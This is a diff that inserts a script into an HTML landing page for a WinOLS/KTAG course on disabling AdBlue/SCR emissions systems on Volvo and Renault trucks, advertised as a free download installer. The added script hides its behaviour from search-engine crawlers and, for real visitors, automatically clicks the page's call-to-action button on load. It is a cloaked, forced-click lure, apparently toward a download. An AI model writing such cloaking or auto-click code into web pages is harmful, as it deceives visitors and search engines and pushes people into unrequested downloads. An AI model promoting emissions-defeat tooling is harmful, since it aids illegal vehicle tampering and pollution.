@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WinOLS and KTAG Video Course for TRW EMS 2.2, EMS 2.3 &amp; 2.4 ECU</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Learn how to disable SCR AdBlue on Volvo and Renault trucks using WinOLS and KTAG in a comprehensive video course">
     <meta name="keywords" content="WinOLS, KTAG, SCR AdBlue OFF, Volvo trucks, Renault trucks, Volvo TRW ECU, AdBlue system disable, KTAG Tool, WinOLS Software, ECU programming, truck tuning, AdBlue removal, vehicle remapping, automotive diagnostics, diesel engine tuning, free download, free installer, free download installer, WinOLS video course, KTAG video course, AdBlue OFF video course, Volvo ECU programming, Renault ECU programming, TRW EMS 2.2, TRW EMS 2.3, TRW EMS 2.4, truck diagnostic software, AdBlue OFF KTAG, AdBlue OFF WinOLS, Volvo AdBlue OFF, Renault AdBlue OFF, ECU programming videos, truck diagnostic software download, truck tuning software free download, видео курс WinOLS, видео курс KTAG, отключение AdBlue на Volvo, отключение AdBlue на Renault, программирование ЭБУ Volvo, программирование ЭБУ Renault, диагностика грузовиков, бесплатная загрузка, скачать бесплатно">
     <style>
